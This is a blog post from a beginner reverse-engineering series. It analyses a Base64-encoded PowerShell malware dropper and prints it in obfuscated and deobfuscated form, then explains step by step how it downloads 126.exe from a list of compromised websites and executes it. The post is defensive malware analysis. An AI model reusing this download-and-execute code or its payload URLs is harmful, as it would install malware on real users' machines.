<!doctype html><html lang=en><head><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="text/html; charset=UTF-8" http-equiv=content-type><meta content="width=device-width,initial-scale=1,user-scalable=no" name=viewport><meta content="index, follow" name=robots><title>Dropper analysis</title><meta content="Dropper analysis" name=title><meta content=Falcon name=author><meta content=website property=og:type><meta content=https://0xf4lc0n.github.io/blog/first-steps-in-re/dropper-analysis/ property=og:url><meta property=og:site_name><meta content="Dropper analysis" property=og:title><meta content=https://0xf4lc0n.github.io/favicon.ico property=og:image><link href=https://0xf4lc0n.github.io/blog/first-steps-in-re/dropper-analysis/ rel=canonical><link rel="shortcut icon" href=https://0xf4lc0n.github.io/favicon.ico type=image/x-icon><link href=https://0xf4lc0n.github.io/atom.xml rel=alternate title=RSS type=application/atom+xml><link href=https://0xf4lc0n.github.io/css/style.css rel=stylesheet><script defer src=https://0xf4lc0n.github.io/js/script.js></script><body><div class=wrapper><header><nav class=navBar><a href=/> /home/ </a><a href=/blog> /blog/ </a><a href=/about> /about/ </a><div class=themeSwitch><button class="themeButton dark" onclick="setTheme('dark')" title="Dark mode"><svg class="icons icons__background"><use href=https://0xf4lc0n.github.io/icons.svg#darkMode></use></svg></button><button class="themeButton light" onclick="setTheme('light')" title="Light mode"><svg class="icons icons__background"><use href=https://0xf4lc0n.github.io/icons.svg#lightMode></use></svg></button></div></nav></header><main><h1>Dropper analysis</h1><p>Whole script was encoed in Base64. In order to decode it I used this PowerShell script:<pre class=language-powershell data-lang=powershell style=background:#282828;color:#fdf4c1aa><code class=language-powershell data-lang=powershell><span style=color:#fdf4c1>$EncodedString </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>get-content</span><span> Base64String.txt
</span><span>[</span><span style=color:#fa5c4b>System.Text.Encoding</span><span>]::ASCII.GetString([</span><span style=color:#fa5c4b>System.Convert</span><span>]::FromBase64String(</span><span style=color:#fdf4c1>$EncodedString </span><span>)) </span><span style=color:#fe8019>| </span><span style=color:#fabd2f>Out-File </span><span style=color:#fe8019>-</span><span>Encoding </span><span style=color:#b8bb26>"ASCII"</span><span> Decoded.txt
</span></code></pre><p>As input the script takes the encoded string from Base64String.txt, decodes it and saves result in Decoded.txt file.<p>Dropper’s code looked like that:<pre class=language-powershell data-lang=powershell style=background:#282828;color:#fdf4c1aa><code class=language-powershell data-lang=powershell><span style=font-style:italic;color:#928374><# https://www.microsoft.com/ #> </span><span style=color:#fdf4c1>$Refined_Plastic_Soapzpp</span><span style=color:#fe8019>=</span><span style=color:#b8bb26>'Bordersodi'</span><span>;</span><span style=color:#fdf4c1>$realtimevfb </span><span style=color:#fe8019>= </span><span style=color:#b8bb26>'126'</span><span>;
</span><span style=color:#fdf4c1>$invoiceoaj</span><span style=color:#fe8019>=</span><span style=color:#b8bb26>'framerlj'</span><span>;</span><span style=color:#fdf4c1>$middlewareltk</span><span style=color:#fe8019>=</span><span style=color:#fdf4c1>$</span><span style=color:#fabd2f>env:</span><span style=color:#fdf4c1>userprofile</span><span style=color:#fe8019>+</span><span style=color:#b8bb26>'\'</span><span style=color:#fe8019>+</span><span style=color:#fdf4c1>$realtimevfb</span><span style=color:#fe8019>+</span><span style=color:#b8bb26>'.exe'</span><span>;
</span><span style=color:#fdf4c1>$back_upjvi</span><span style=color:#fe8019>=</span><span style=color:#b8bb26>'Berkshirekwz'</span><span>;</span><span style=color:#fdf4c1>$Plazakpi</span><span style=color:#fe8019>=</span><span>.(</span><span style=color:#b8bb26>'new-'</span><span style=color:#fe8019>+</span><span style=color:#b8bb26>'ob'</span><span style=color:#fe8019>+</span><span style=color:#b8bb26>'ject'</span><span>) NEt.WebCLieNT;
</span><span style=color:#fdf4c1>$Dynamicqmb</span><span style=color:#fe8019>=</span><span style=color:#b8bb26>'http://www.pieceofpassion.net/0xrnl3/a27xm99fgd_on7xp-31134189/
</span><span style=color:#b8bb26>@http://www.marketfxelite.com/wp-admin/unnJtCHk/@https://tananfood.com/wp-includes/yoclwyWE/
</span><span style=color:#b8bb26>@http://raisabook.com/wp-content/NjBtuxBzkD/@http://biswalfoodcircle.com/vcobhlons/kaf6j_71wzkgvqso-8/'</span><span>.</span><span style=color:#b8bb26>"sP`Lit"</span><span>(</span><span style=color:#b8bb26>'@'</span><span>);
</span><span style=color:#fdf4c1>$Clubomb</span><span style=color:#fe8019>=</span><span style=color:#b8bb26>'Estateswjs'</span><span>;</span><span style=color:#fa5c4b>foreach</span><span>(</span><span style=color:#fdf4c1>$Music__Gamespmu </span><span style=color:#fa5c4b>in </span><span style=color:#fdf4c1>$Dynamicqmb</span><span>){</span><span style=color:#fa5c4b>try</span><span>{</span><span style=color:#fdf4c1>$Plazakpi</span><span>.</span><span style=color:#b8bb26>"dO`wN`lOa`dfiLE"</span><span>(</span><span style=color:#fdf4c1>$Music__Gamespmu</span><span style=color:#fe8019>, </span><span style=color:#fdf4c1>$middlewareltk</span><span>);
</span><span style=color:#fdf4c1>$Applicationsiqr</span><span style=color:#fe8019>=</span><span style=color:#b8bb26>'Grocerytiw'</span><span>;</span><span style=color:#fa5c4b>If </span><span>((</span><span style=color:#fe8019>&</span><span>(</span><span style=color:#b8bb26>'Get'</span><span style=color:#fe8019>+</span><span style=color:#b8bb26>'-I'</span><span style=color:#fe8019>+</span><span style=color:#b8bb26>'tem'</span><span>) </span><span style=color:#fdf4c1>$middlewareltk</span><span>).</span><span style=color:#b8bb26>"LE`NgTh" </span><span style=color:#fe8019>-ge </span><span style=color:#d3869b>35609</span><span>) 
</span><span>{[</span><span style=color:#fa5c4b>Diagnostics.Process</span><span>]::</span><span style=color:#b8bb26>"s`TARt"</span><span>(</span><span style=color:#fdf4c1>$middlewareltk</span><span>);</span><span style=color:#fdf4c1>$transformvdp</span><span style=color:#fe8019>=</span><span style=color:#b8bb26>'Bedfordshirejwc'</span><span>;</span><span style=color:#fa5c4b>break</span><span>;</span><span style=color:#fdf4c1>$Concreteija</span><span style=color:#fe8019>=</span><span style=color:#b8bb26>'redundantwwi'</span><span>}}</span><span style=color:#fa5c4b>catch</span><span>{}}
</span><span style=color:#fdf4c1>$morphtqb</span><span style=color:#fe8019>=</span><span style=color:#b8bb26>'Gorgeous_Fresh_Hatiqb'
</span></code></pre><p>It was also obfuscated so I deobfuscated it (here it was much simpler).<pre class=language-powershell data-lang=powershell style=background:#282828;color:#fdf4c1aa><code class=language-powershell data-lang=powershell><span style=font-style:italic;color:#928374><# https://www.microsoft.com/ #> 
</span><span style=color:#fdf4c1>$file_name </span><span style=color:#fe8019>= </span><span style=color:#b8bb26>'126'</span><span>;
</span><span style=color:#fdf4c1>$file_path </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>$</span><span style=color:#fabd2f>ENV:</span><span style=color:#fdf4c1>USERPROFILE</span><span>;
</span><span style=color:#fdf4c1>$file_full_path </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>$file_path </span><span style=color:#fe8019>+ </span><span style=color:#b8bb26>'\' </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>$file_name </span><span style=color:#fe8019>+ </span><span style=color:#b8bb26>'.exe'</span><span>;
</span><span>
</span><span style=color:#fdf4c1>$web_client </span><span style=color:#fe8019>=</span><span> .(</span><span style=color:#b8bb26>'new-object'</span><span>) NET.WebClient;
</span><span style=color:#fdf4c1>$url_list </span><span style=color:#fe8019>= </span><span style=color:#b8bb26>'http://www.pieceofpassion.net/0xrnl3/a27xm99fgd_on7xp-31134189/
</span><span style=color:#b8bb26>        @http://www.marketfxelite.com/wp-admin/unnJtCHk/
</span><span style=color:#b8bb26>        @https://tananfood.com/wp-includes/yoclwyWE/
</span><span style=color:#b8bb26>        @http://raisabook.com/wp-content/NjBtuxBzkD/
</span><span style=color:#b8bb26>        @http://biswalfoodcircle.com/vcobhlons/kaf6j_71wzkgvqso-8/'</span><span>.</span><span style=color:#b8bb26>"SPLIT"</span><span>(</span><span style=color:#b8bb26>'@'</span><span>);
</span><span>
</span><span style=color:#fa5c4b>foreach </span><span>(</span><span style=color:#fdf4c1>$url </span><span style=color:#fa5c4b>in </span><span style=color:#fdf4c1>$url_list</span><span>) {
</span><span style=color:#fa5c4b>try </span><span>{
</span><span>    </span><span style=color:#fdf4c1>$web_client.DownloadFile</span><span>(</span><span style=color:#fdf4c1>$url</span><span style=color:#fe8019>, </span><span style=color:#fdf4c1>$file_full_path</span><span>);
</span><span>    </span><span style=color:#fa5c4b>If </span><span>((</span><span style=color:#fe8019>&</span><span>(</span><span style=color:#b8bb26>'Get-Item'</span><span>) </span><span style=color:#fdf4c1>$file_full_path</span><span>).</span><span style=color:#b8bb26>"Length" </span><span style=color:#fe8019>-ge </span><span style=color:#d3869b>35609</span><span>) {
</span><span>        [</span><span style=color:#fa5c4b>Diagnostics.Process</span><span>]::</span><span style=color:#b8bb26>"Start"</span><span>(</span><span style=color:#fdf4c1>$file_full_path</span><span>);
</span><span>        </span><span style=color:#fa5c4b>break</span><span>;
</span><span>    }
</span><span>} </span><span style=color:#fa5c4b>catch </span><span>{}
</span><span>}
</span></code></pre><p>Explanation is presented below:<ol><li>The result file is 126.exe, that file will be created in user home directory what is pointed by file_full_path.<li>Then WebClient object is created which allows for sending and recieving data identified by URI identifier. (‘.’ is a call operator)<li>url_list is an array which contains URI identifiers. Split function separates URIs by the ‘@’ character and places them in the next indexes of array.<li>In for loop WebClient object tries to download the content of 126.exe file from sites stored in url_list.<li>After each attempt to download the content, the script checks a size of resulted file. If size of that file is greater than 35609 bytes, the file is executed.</ol><h4 id=table-of-content>Table of content:</h4><ol><li><a href=/blog/first-steps-in-re/environment-configuration>Environment configuration</a><li><a href=/blog/first-steps-in-re/initial-analysis>Initial analysis</a><li><a href=/blog/first-steps-in-re/macro-analysis>Macro analysis</a><li><a href=/blog/first-steps-in-re/dropper-analysis>Dropper analysis</a><li><a href=/blog/first-steps-in-re/detonation>Detonation</a><li><a href=/blog/first-steps-in-re/domain-analysis>Domain analysis</a><li><a href=/blog/first-steps-in-re/detonation-v2>Detonation ver. 2</a><li><a href=/blog/first-steps-in-re/summary>Summary</a></ol><p class=tagsData></main><footer><hr><div class=footContainer><div class=footLeft><p>Licensed under <a rel="noopener noreferrer" href=https://fr.wikipedia.org/wiki/Licence_MIT target=_blank>MIT</a><br> Built with <a rel="noopener noreferrer" href=https://www.getzola.org target=_blank>Zola</a> using <a rel="noopener noreferrer" href=https://github.com/Speyll/anemone target=_blank>anemone</a> theme & <a rel="noopener noreferrer" href=https://github.com/Speyll/veqev target=_blank>veqev</a> colors.<br></div><div class=footRight><a rel="noopener noreferrer" title="Subscribe via RSS for updates." class=icons__background href=https://0xf4lc0n.github.io/atom.xml target=_blank><svg class="icons icons__background"><use href=https://0xf4lc0n.github.io/icons.svg#rss></use></svg></a></div></div></footer></div>